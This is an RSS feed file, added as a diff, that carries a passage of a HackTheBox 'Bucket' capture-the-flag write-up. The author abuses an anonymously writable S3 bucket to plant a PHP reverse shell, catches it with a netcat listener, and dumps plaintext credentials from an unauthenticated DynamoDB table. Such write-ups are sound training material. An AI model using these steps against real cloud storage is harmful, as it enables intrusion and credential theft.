@@ -1,0 +1,638 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>LocalStack on Ef&#39;s log</title>
+    <link>https://fahmifj.github.io/tags/localstack/</link>
+    <description>Recent content in LocalStack on Ef&#39;s log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <lastBuildDate>Sat, 24 Apr 2021 22:03:47 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/localstack/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>HackTheBox - Bucket</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</link>
+      <pubDate>Sat, 24 Apr 2021 22:03:47 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-bucket/</guid>
+      <description>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user.</description>
+      <content:encoded><![CDATA[<p>Bucket, as the name implies, features an Amazon S3 bucket that has been configured to allow anonymous users to perform read/write operations to the objects inside a bucket. This type of misconfiguration can be leveraged to gain a foothold on the box by dropping a web shell. The box also has DynamoDB using the same configuration that allows anonymous users to perform read/write access. Enumeration on the DynamoDB discovers several credentials and one of the credentials is reused by the user. Inspecting the web configuration files reveals that there is  an internal web currently running as a root user, which then can be exploited to gain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>Pentesting AWS S3</li>
+<li>Port Forwarding</li>
+<li>Exploiting PD4ML</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Gobuster - <a href="https://github.com/OJ/gobuster">https://github.com/OJ/gobuster</a></li>
+<li>AWS CLI - <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<p><code>nmap</code> shows two open ports: 22 (SSH) and 80 (HTTP).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ mkdir nmap; nmap -sC -sV -oA nmap/initial-bucket 10.10.10.212
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu <span style="color:#ae81ff">4</span> <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41
+| http-methods: 
+|_  Supported Methods: GET POST OPTIONS HEAD
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Site doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t have a title <span style="color:#f92672">(</span>text/html<span style="color:#f92672">)</span>.
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p>Scanning through all the ports return the same result.</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---buckethtb">TCP 80 - bucket.htb</h3>
+<p>Visiting this port via browser redirects to <code>http://bucket.htb/</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-html" data-lang="html">→ root@iamf «bucket» «10.10.14.39» 
+$ curl -s http://10.10.10.212
+
+<span style="color:#75715e">&lt;!DOCTYPE HTML PUBLIC &#34;-//IETF//DTD HTML 2.0//EN&#34;&gt;</span>
+&lt;<span style="color:#f92672">html</span>&gt;&lt;<span style="color:#f92672">head</span>&gt;
+&lt;<span style="color:#f92672">title</span>&gt;302 Found&lt;/<span style="color:#f92672">title</span>&gt;
+&lt;/<span style="color:#f92672">head</span>&gt;&lt;<span style="color:#f92672">body</span>&gt;
+&lt;<span style="color:#f92672">h1</span>&gt;Found&lt;/<span style="color:#f92672">h1</span>&gt;
+&lt;<span style="color:#f92672">p</span>&gt;The document has moved &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://bucket.htb/&#34;</span>&gt;here&lt;/<span style="color:#f92672">a</span>&gt;.&lt;/<span style="color:#f92672">p</span>&gt;
+&lt;<span style="color:#f92672">hr</span>&gt;
+&lt;<span style="color:#f92672">address</span>&gt;Apache/2.4.41 (Ubuntu) Server at 10.10.10.212 Port 80&lt;/<span style="color:#f92672">address</span>&gt;
+&lt;/<span style="color:#f92672">body</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+</code></pre></div><p>I&rsquo;ll add <code>bucket.htb</code> to <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb
+</code></pre></div><p>Now it displays a web page called &ldquo;Bucket Advertising Platform&rdquo;.</p>
+<p><div class="img-container"><img src="imgs/image-20210422234425022.png" alt="image-20210422234425022"  /></div>
+</p>
+<p>Inspecting the page source discovers a vhost.</p>
+<p><div class="img-container"><img src="imgs/image-20210422234754897.png" alt="image-20210422234754897"  /></div>
+</p>
+<p>I&rsquo;ll add the vhost name to <code>/etc/hosts</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb
+</code></pre></div><h4 id="gobuster">Gobuster</h4>
+<p>There&rsquo;s no interesting results.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ gobuster dir -u http://bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-M-80
+
+...&lt;SNIP&gt;...
+/index.html           <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 5344<span style="color:#f92672">]</span>
+/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
+</code></pre></div><h3 id="tcp-80---s3buckethtb">TCP 80 - s3.bucket.htb</h3>
+<p>Visiting the newly discovered hostname displays a typical json output format.</p>
+<p><div class="img-container"><img src="imgs/image-20210422235335494.png" alt="image-20210422235335494"  /></div>
+</p>
+<h4 id="gobuster-1">Gobuster</h4>
+<p><code>gobuster</code> scan discovers a few web paths.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ gobuster dir -u http://s3.bucket.htb/ -x html,txt,bak -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories.txt -o gobuster/gobuster-vhost-M-80
+
+...&lt;SNIP&gt;...
+/shell                <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 0<span style="color:#f92672">]</span>
+/health               <span style="color:#f92672">(</span>Status: 200<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 54<span style="color:#f92672">]</span>
+/server-status        <span style="color:#f92672">(</span>Status: 403<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>Size: 275<span style="color:#f92672">]</span> 
+</code></pre></div><h4 id="shell">/shell</h4>
+<p>Vising <code>/shell</code> redirects to http://444af250749d:4566/shell/.</p>
+<p><div class="img-container"><img src="imgs/image-20210424222707480.png" alt="image-20210424222707480"  /></div>
+</p>
+<p>On <code>curl</code>, the server returns with a bunch of HTTP headers in its response</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «~» «10.10.14.51» 
+$ curl -sv http://s3.bucket.htb/shell
+
+...&lt;SNIP&gt;...
+&lt; refresh: 0; url<span style="color:#f92672">=</span>http://444af250749d:4566/shell/
+&lt; access-control-allow-origin: *
+&lt; access-control-allow-methods: HEAD,GET,PUT,POST,DELETE,OPTIONS,PATCH
+&lt; access-control-allow-headers: authorization,content-type,content-md5,cache-control,x-amz-content-sha256,x-amz-date,x-amz-security-token,x-amz-user-agent,x-amz-target,x-amz-acl,x-amz-version-id,x-localstack-target,x-amz-tagging
+&lt; access-control-expose-headers: x-amz-version-id
+&lt; 
+* Connection <span style="color:#75715e">#0 to host s3.bucket.htb left intact</span>
+</code></pre></div><p>I added it to <code>/etc/hosts</code> but it still doesn&rsquo;t resolve.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">10.10.10.212    bucket.htb s3.bucket.htb 444af250749d
+</code></pre></div><p>Searching some of the header names on Google reveals those are used by Amazon S3</p>
+<p><div class="img-container"><img src="imgs/image-20210425002915838.png" alt="image-20210425002915838"  /></div>
+</p>
+<p>Adding another <code>/</code> at the end of uri resolve to a DynamoDB JavaScript Shell. I have no familiarity on this.</p>
+<p><div class="img-container"><img src="imgs/image-20210424223257481.png" alt="image-20210424223257481"  /></div>
+</p>
+<h4 id="health">/health</h4>
+<p><code>/health</code> is probably an endpoint to monitor the service status.</p>
+<p><div class="img-container"><img src="imgs/image-20210422235825937.png" alt="image-20210422235825937"  /></div>
+</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="aws-s3">AWS S3</h4>
+<p>S3 stands for Simple Storage Service. It is a storage service offered by Amazon. To interact with the AWS S3, I&rsquo;ll use <a href="https://docs.aws.amazon.com/cli/latest/userguide/install-cliv2-linux.html#cliv2-linux-install">aws cli</a>. You can find the user guide <a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-listing-buckets">here</a>.</p>
+<p>Usage in general:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">aws [options] s3 &lt;subcommand&gt; [parameters]
+</code></pre></div><p>I&rsquo;ll start by listing the S3 bucket, but then it returns an error message.</p>
+<blockquote>
+<p>A bucket is a container for objects stored in Amazon S3. It is a folder but not really a folder.</p>
+</blockquote>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
+You must specify a region. You can also configure your region by running <span style="color:#e6db74">&#34;aws configure&#34;</span>.
+</code></pre></div><p>I can resolve the problem above by typing <code>aws configure</code> and fill only the default region.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws configure
+AWS Access Key ID <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
+AWS Secret Access Key <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
+Default region name <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>: us-east-1
+Default output format <span style="color:#f92672">[</span>None<span style="color:#f92672">]</span>:
+</code></pre></div><p>Now it works and returns a bucket called <code>adserver</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 ls --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
+2020-10-21 09:16:03 adserver
+</code></pre></div><p>I can also read the objects inside <code>adserver</code> bucket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 ls s3://adserver --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
+                           PRE images/
+2020-10-21 09:22:04       <span style="color:#ae81ff">5344</span> index.html
+
+→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 ls s3://adserver/images/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
+2020-10-21 09:52:04      <span style="color:#ae81ff">37840</span> bug.jpg
+2020-10-21 09:52:04      <span style="color:#ae81ff">51485</span> cloud.png
+2020-10-21 09:52:04      <span style="color:#ae81ff">16486</span> malware.png
+</code></pre></div><p>Those files are the same file used in <code>bucket.htb</code></p>
+<h4 id="php-reverse-shell-upload-via-s3">PHP Reverse Shell upload via S3</h4>
+<p>The aws subcommand <code>cp</code> allows to copy a file (objects) from local to a bucket, and vice versa (<a href="https://docs.aws.amazon.com/cli/latest/userguide/cli-services-s3-commands.html#using-s3-commands-managing-objects-copy">source</a>).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">aws s3 cp &lt;source&gt; &lt;target&gt; <span style="color:#f92672">[</span>--options<span style="color:#f92672">]</span>
+</code></pre></div><p>Because I know the web server is Apache, I&rsquo;ll create a php test files and upload it to the bucket.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ echo <span style="color:#e6db74">&#39;&lt;?php echo &#34;IamF&#34; ?&gt;&#39;</span> &gt; iamf-test.php
+
+→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
+upload: ./iamf-test.php to s3://adserver/iamf-test.php 
+</code></pre></div><p>I can confirm the file was successfully uploaded with the subcommand <code>ls</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 ls s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb 
+                           PRE images/
+2021-04-22 14:05:15         <span style="color:#ae81ff">21</span> iamf-test.php
+2021-04-22 14:05:04       <span style="color:#ae81ff">5344</span> index.html
+</code></pre></div><p>The file is available at <code>http://s3.bucket.htb/adserver/iamf-test.php</code> and <code>http://bucket.htb/iamf-test.php</code> but the execution of php code happens on <code>bucket.htb</code>. A few minutes later my files got deleted, so I can guess there&rsquo;s a cleanup happening.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ curl -s http://s3.bucket.htb/adserver/iamf-test.php
+&lt;?php echo <span style="color:#e6db74">&#34;IamF&#34;</span> ?&gt;
+
+→ root@iamf «bucket» «10.10.14.39» 
+$ curl -s http://bucket.htb/iamf-test.php
+IamF
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423010636324.png" alt="image-20210423010636324"  /></div>
+</p>
+<p>Now I can try to drop a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">PHP reverse shell</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws s3 cp ./iamf-test.php s3://adserver/ --endpoint-url<span style="color:#f92672">=</span>http://s3.bucket.htb
+</code></pre></div><p>Then I&rsquo;ll trigger it using <code>curl</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ curl -s http://bucket.htb/iamf.php
+</code></pre></div><p>I have a shell now on my listener (wait for a few minutes or reupload the shell if it doesn&rsquo;t).</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ rlwrap nc -nvlp <span style="color:#ae81ff">9001</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.39<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.212<span style="color:#f92672">]</span> <span style="color:#ae81ff">58352</span>
+Linux bucket 5.4.0-48-generic <span style="color:#75715e">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 18:14:02 up 13:18,  <span style="color:#ae81ff">0</span> users,  load average: 0.03, 0.04, 0.04
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1050<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+www-data@bucket:/$ 
+</code></pre></div><p><div class="img-container"><img src="imgs/image-20210423011428675.png" alt="image-20210423011428675"  /></div>
+</p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-roy">Shell as roy</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>There is a <code>bucket-app</code>, but I don&rsquo;t have access to it.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la
+total <span style="color:#ae81ff">16</span>
+drwxr-xr-x   <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 .
+drwxr-xr-x  <span style="color:#ae81ff">14</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 ..
+drwxr-x---+  <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 12:29 bucket-app
+drwxr-xr-x   <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 18:27 html
+</code></pre></div><p><code>roy</code> is the only user in this box.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/$ cat /etc/passwd | grep sh$
+root:x:0:0:root:/root:/bin/bash
+roy:x:1000:1000:,,,:/home/roy:/bin/bash
+</code></pre></div><p>Visiting <code>roy</code> home directory discovers a folder called <code>project</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/var/www$ ls -la /home/roy
+total <span style="color:#ae81ff">44</span>
+drwxr-xr-x <span style="color:#ae81ff">7</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> ..
+drwxrwxr-x <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 12:03 .aws
+lrwxrwxrwx <span style="color:#ae81ff">1</span> roy  roy     <span style="color:#ae81ff">9</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_history -&gt; /dev/null
+-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">220</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bash_logout
+-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy  <span style="color:#ae81ff">3771</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .bashrc
+drwx------ <span style="color:#ae81ff">2</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:57 .cache
+drwx------ <span style="color:#ae81ff">4</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 08:01 .gnupg
+-rw-r--r-- <span style="color:#ae81ff">1</span> roy  roy   <span style="color:#ae81ff">807</span> Sep <span style="color:#ae81ff">16</span>  <span style="color:#ae81ff">2020</span> .profile
+drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 project
+drwxr-xr-x <span style="color:#ae81ff">3</span> roy  roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">22</span> 07:59 snap
+-r-------- <span style="color:#ae81ff">1</span> roy  roy    <span style="color:#ae81ff">33</span> Apr <span style="color:#ae81ff">22</span> 04:56 user.txt
+</code></pre></div><p>The files inside <code>project</code> are readable by others.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ ls -la
+total <span style="color:#ae81ff">44</span>
+drwxr-xr-x  <span style="color:#ae81ff">3</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> .
+drwxr-xr-x  <span style="color:#ae81ff">5</span> roy roy  <span style="color:#ae81ff">4096</span> Apr <span style="color:#ae81ff">24</span> 17:31 ..
+-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy    <span style="color:#ae81ff">63</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.json
+-rw-rw-r--  <span style="color:#ae81ff">1</span> roy roy <span style="color:#ae81ff">20533</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> composer.lock
+-rw-r--r--  <span style="color:#ae81ff">1</span> roy roy   <span style="color:#ae81ff">367</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> db.php
+drwxrwxr-x <span style="color:#ae81ff">10</span> roy roy  <span style="color:#ae81ff">4096</span> Sep <span style="color:#ae81ff">24</span>  <span style="color:#ae81ff">2020</span> vendor
+</code></pre></div><p>Looking into <code>db.php</code>, the project seems to use AWS DynamoDB as the project database. I can also see the endpoint url.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ cat db.php
+
+&lt;?php
+require <span style="color:#e6db74">&#39;vendor/autoload.php&#39;</span>;
+date_default_timezone_set<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;America/New_York&#39;</span><span style="color:#f92672">)</span>;
+use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\D</span>ynamoDbClient;
+use Aws<span style="color:#ae81ff">\D</span>ynamoDb<span style="color:#ae81ff">\E</span>xception<span style="color:#ae81ff">\D</span>ynamoDbException;
+
+$client <span style="color:#f92672">=</span> new Aws<span style="color:#ae81ff">\S</span>dk<span style="color:#f92672">([</span>
+    <span style="color:#e6db74">&#39;profile&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;default&#39;</span>,
+    <span style="color:#e6db74">&#39;region&#39;</span>  <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;us-east-1&#39;</span>,
+    <span style="color:#e6db74">&#39;version&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;latest&#39;</span>,
+    <span style="color:#e6db74">&#39;endpoint&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;http://localhost:4566&#39;</span>
+<span style="color:#f92672">])</span>;
+
+$dynamodb <span style="color:#f92672">=</span> $client-&gt;createDynamoDb<span style="color:#f92672">()</span>;
+
+//todo
+</code></pre></div><p><code>localhost:4566</code> is the internal endpoint of <code>s3.bucket.htb</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@bucket:/home/roy/project$ curl -s http://localhost:4566
+
+<span style="color:#f92672">{</span>
+	<span style="color:#e6db74">&#34;s3&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>, 
+	<span style="color:#e6db74">&#34;dynamodb&#34;</span>: <span style="color:#e6db74">&#34;running&#34;</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><h4 id="aws-dynamodb">AWS DynamoDB</h4>
+<p>DynamoDB is a NoSQL database developed by Amazon. I can also use the amazon cli to interact with the DynamoDB, and it uses the same endpoint as the S3.</p>
+<p>General usage:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">usage: aws <span style="color:#f92672">[</span>options<span style="color:#f92672">]</span> dynamodb &lt;subcommand&gt; <span style="color:#f92672">[</span>&lt;subcommand&gt; ...<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>parameters<span style="color:#f92672">]</span>
+</code></pre></div><p>Anonymous user is allowed to list the database tables.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;TableNames&#34;</span>: <span style="color:#f92672">[</span>
+        <span style="color:#e6db74">&#34;users&#34;</span>
+    <span style="color:#f92672">]</span>
+<span style="color:#f92672">}</span>
+</code></pre></div><p>I can read the content of table <code>users</code> with the subcommand <code>scan</code>, and it discovers several credentials.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «bucket» «10.10.14.39» 
+$ aws dynamodb scan --table-name users --endpoint-url http://s3.bucket.htb
+<span style="color:#f92672">{</span>
+    <span style="color:#e6db74">&#34;Items&#34;</span>: <span style="color:#f92672">[</span>
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Management@#1@#&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Mgmt&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>,
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Welcome123!&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Cloudadm&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>,
+        <span style="color:#f92672">{</span>
+            <span style="color:#e6db74">&#34;password&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;n2vM-&lt;_K_Q:.Aa2&#34;</span>
+            <span style="color:#f92672">}</span>,
+            <span style="color:#e6db74">&#34;username&#34;</span>: <span style="color:#f92672">{</span>
+                <span style="color:#e6db74">&#34;S&#34;</span>: <span style="color:#e6db74">&#34;Sysadm&#34;</span>
+            <span style="color:#f92672">}</span>
+        <span style="color:#f92672">}</span>
+    <span style="color:#f92672">]</span>,
+    <span style="color:#e6db74">&#34;Count&#34;</span>: 3,
+    <span style="color:#e6db74">&#34;ScannedCount&#34;</span>: 3,
+    <span style="color:#e6db74">&#34;ConsumedCapacity&#34;</span>: null
+<span style="color:#f92672">}</span>
+</code></pre></div><p>I&rsquo;ll keep those credentials.</p>
